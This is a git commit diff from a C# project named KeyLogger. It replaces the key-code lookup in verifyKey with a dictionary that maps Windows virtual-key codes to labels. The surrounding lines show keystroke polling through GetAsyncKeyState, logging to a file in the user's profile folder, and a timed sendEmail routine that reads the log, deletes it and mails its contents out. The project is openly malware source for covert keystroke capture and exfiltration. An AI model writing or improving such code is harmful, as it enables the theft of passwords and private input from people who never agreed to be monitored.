6c14bf8dc86ae7f1cda3cc0bf53af73516c62bf1
MaheuTaroo <pantupa@gmail.com>
2022-07-14 00:05:27 +0100

    verifyKey(int code): changed if-else chain to dictionary checking

--- KeyLogger/KeyLogger/Program.cs
+++ KeyLogger/KeyLogger/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
@@ -10,7 +11,117 @@ namespace KeyLogger
 {
     class Program
     {
-        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";
+        private string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";
+
+        private Dictionary<int, string> KeysDictionary = new Dictionary<int, string>()
+        {
+            { 8, "[Back]" },
+            { 9, "[TAB]" },
+            { 13, "[Enter]" },
+            { 19, "[Pause]" },
+            { 20, "[Caps Lock]" },
+            { 27, "[Esc]" },
+            { 32, "[Space]" },
+            { 33, "[Page Up]" },
+            { 34, "[Page Down]" },
+            { 35, "[End]" },
+            { 36, "[Home]" },
+            { 37, "[Left]" },
+            { 38, "[Up]" },
+            { 39, "[Right]" },
+            { 40, "[Down]" },
+            { 44, "[Print Screen]" },
+            { 45, "[Insert]" },
+            { 46, "[Delete]" },
+            { 48, "0" },
+            { 49, "1" },
+            { 50, "2" },
+            { 51, "3" },
+            { 52, "4" },
+            { 53, "5" },
+            { 54, "6" },
+            { 55, "7" },
+            { 56, "8" },
+            { 57, "9" },
+            { 65, "a" },
+            { 66, "b" },
+            { 67, "c" },
+            { 68, "d" },
+            { 69, "e" },
+            { 70, "f" },
+            { 71, "g" },
+            { 72, "h" },
+            { 73, "i" },
+            { 74, "j" },
+            { 75, "k" },
+            { 76, "l" },
+            { 77, "m" },
+            { 78, "n" },
+            { 79, "o" },
+            { 80, "p" },
+            { 81, "q" },
+            { 82, "r" },
+            { 83, "s" },
+            { 84, "t" },
+            { 85, "u" },
+            { 86, "v" },
+            { 87, "w" },
+            { 88, "x" },
+            { 89, "y" },
+            { 90, "z" },
+            { 91, "[Windows]" },
+            { 92, "[Windows]" },
+            { 93, "[List]" },
+            { 96, "0" },
+            { 97, "1" },
+            { 98, "2" },
+            { 99, "3" },
+            { 100, "4" },
+            { 101, "5" },
+            { 102, "6" },
+            { 103, "7" },
+            { 104, "8" },
+            { 105, "9" },
+            { 106, "*" },
+            { 107, "+" },
+            { 109, "-" },
+            { 110, "," },
+            { 111, "/" },
+            { 112, "[F1]" },
+            { 113, "[F2]" },
+            { 114, "[F3]" },
+            { 115, "[F4]" },
+            { 116, "[F5]" },
+            { 117, "[F6]" },
+            { 118, "[F7]" },
+            { 119, "[F8]" },
+            { 120, "[F9]" },
+            { 121, "[F10]" },
+            { 122, "[F11]" },
+            { 123, "[F12]" },
+            { 144, "[Num Lock]" },
+            { 145, "[Scroll Lock]" },
+            { 160, "[Shift]" },
+            { 161, "[Shift]" },
+            { 162, "[Ctrl]" },
+            { 163, "[Ctrl]" },
+            { 164, "[Alt]" },
+            { 165, "[Alt]" },
+            { 186, "ç" },
+            { 187, "=" },
+            { 188, "," },
+            { 189, "-" },
+            { 190, "." },
+            { 191, ";" },
+            { 192, "'" },
+            { 193, "/" },
+            { 194, "." },
+            { 219, "´" },
+            { 220, "]" },
+            { 221, "[" },
+            { 222, "~" },
+            { 226, "\\" }
+        };
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -45,122 +156,12 @@ namespace KeyLogger
             }
         }
 
-        private String verifyKey(int code)
+        private string verifyKey(int code)
         {
-            String key = "";
-
-            if (code == 8) key = "[Back]";
-            else if (code == 9) key = "[TAB]";
-            else if (code == 13) key = "[Enter]";
-            else if (code == 19) key = "[Pause]";
-            else if (code == 20) key = "[Caps Lock]";
-            else if (code == 27) key = "[Esc]";
-            else if (code == 32) key = "[Space]";
-            else if (code == 33) key = "[Page Up]";
-            else if (code == 34) key = "[Page Down]";
-            else if (code == 35) key = "[End]";
-            else if (code == 36) key = "[Home]";
-            else if (code == 37) key = "Left]";
-            else if (code == 38) key = "[Up]";
-            else if (code == 39) key = "[Right]";
-            else if (code == 40) key = "[Down]";
-            else if (code == 44) key = "[Print Screen]";
-            else if (code == 45) key = "[Insert]";
-            else if (code == 46) key = "[Delete]";
-            else if (code == 48) key = "0";
-            else if (code == 49) key = "1";
-            else if (code == 50) key = "2";
-            else if (code == 51) key = "3";
-            else if (code == 52) key = "4";
-            else if (code == 53) key = "5";
-            else if (code == 54) key = "6";
-            else if (code == 55) key = "7";
-            else if (code == 56) key = "8";
-            else if (code == 57) key = "9";
-            else if (code == 65) key = "a";
-            else if (code == 66) key = "b";
-            else if (code == 67) key = "c";
-            else if (code == 68) key = "d";
-            else if (code == 69) key = "e";
-            else if (code == 70) key = "f";
-            else if (code == 71) key = "g";
-            else if (code == 72) key = "h";
-            else if (code == 73) key = "i";
-            else if (code == 74) key = "j";
-            else if (code == 75) key = "k";
-            else if (code == 76) key = "l";
-            else if (code == 77) key = "m";
-            else if (code == 78) key = "n";
-            else if (code == 79) key = "o";
-            else if (code == 80) key = "p";
-            else if (code == 81) key = "q";
-            else if (code == 82) key = "r";
-            else if (code == 83) key = "s";
-            else if (code == 84) key = "t";
-            else if (code == 85) key = "u";
-            else if (code == 86) key = "v";
-            else if (code == 87) key = "w";
-            else if (code == 88) key = "x";
-            else if (code == 89) key = "y";
-            else if (code == 90) key = "z";
-            else if (code == 91) key = "[Windows]";
-            else if (code == 92) key = "[Windows]";
-            else if (code == 93) key = "[List]";
-            else if (code == 96) key = "0";
-            else if (code == 97) key = "1";
-            else if (code == 98) key = "2";
-            else if (code == 99) key = "3";
-            else if (code == 100) key = "4";
-            else if (code == 101) key = "5";
-            else if (code == 102) key = "6";
-            else if (code == 103) key = "7";
-            else if (code == 104) key = "8";
-            else if (code == 105) key = "9";
-            else if (code == 106) key = "*";
-            else if (code == 107) key = "+";
-            else if (code == 109) key = "-";
-            else if (code == 110) key = ",";
-            else if (code == 111) key = "/";
-            else if (code == 112) key = "[F1]";
-            else if (code == 113) key = "[F2]";
-            else if (code == 114) key = "[F3]";
-            else if (code == 115) key = "[F4]";
-            else if (code == 116) key = "[F5]";
-            else if (code == 117) key = "[F6]";
-            else if (code == 118) key = "[F7]";
-            else if (code == 119) key = "[F8]";
-            else if (code == 120) key = "[F9]";
-            else if (code == 121) key = "[F10]";
-            else if (code == 122) key = "[F11]";
-            else if (code == 123) key = "[F12]";
-            else if (code == 144) key = "[Num Lock]";
-            else if (code == 145) key = "[Scroll Lock]";
-            else if (code == 160) key = "[Shift]";
-            else if (code == 161) key = "[Shift]";
-            else if (code == 162) key = "[Ctrl]";
-            else if (code == 163) key = "[Ctrl]";
-            else if (code == 164) key = "[Alt]";
-            else if (code == 165) key = "[Alt]";
-            else if (code == 187) key = "=";
-            else if (code == 186) key = "ç";
-            else if (code == 188) key = ",";
-            else if (code == 189) key = "-";
-            else if (code == 190) key = ".";
-            else if (code == 192) key = "'";
-            else if (code == 191) key = ";";
-            else if (code == 193) key = "/";
-            else if (code == 194) key = ".";
-            else if (code == 219) key = "´";
-            else if (code == 220) key = "]";
-            else if (code == 221) key = "[";
-            else if (code == 222) key = "~";
-            else if (code == 226) key = "\\";
-            else key = "[" + code + "]";
-
-            return key;
+            return KeysDictionary.ContainsKey(code) ? KeysDictionary[code] : "[" + code + "]";
         }
 
-        private void sendEmail(Object source, ElapsedEventArgs e)
+        private void sendEmail(object source, ElapsedEventArgs e)
         {
             try
             {
@@ -173,7 +174,7 @@ namespace KeyLogger
 
                 if (!File.Exists(path)) return;
                 StreamReader r = new StreamReader(path);
-                String content = r.ReadLine();
+                string content = r.ReadLine();
                 r.Close();
                 File.Delete(path);
                 mail.Body = content;
